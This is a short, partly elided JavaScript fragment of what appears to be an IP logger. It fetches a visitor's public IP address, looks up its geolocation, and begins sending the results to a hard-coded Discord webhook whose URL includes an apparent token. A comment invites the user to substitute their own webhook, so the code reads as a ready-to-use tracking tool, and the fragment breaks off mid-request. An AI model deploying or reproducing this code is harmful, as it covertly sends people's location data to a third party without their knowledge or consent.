    ...
    fetch('https://api.ipify.org?format=json')
        ...
        .then(ipData => {
            ...
            return fetch(`https://ipapi.co/${ipadd}/json/`)
                ...
                .then(geoData => {
                    const dscURL = 'https://discord.com/api/webhooks/1406076877608587406/YtRDTEO6iE8lvoqHdKmpPquTzI6RDUD7sf9DGKUEg_g9kcFm_JLXY6PF98v7Ry9SMBht'; // replace with your webhook url
                    return fetch(dscURL, {
                        method: 'POST',
                        headers: {
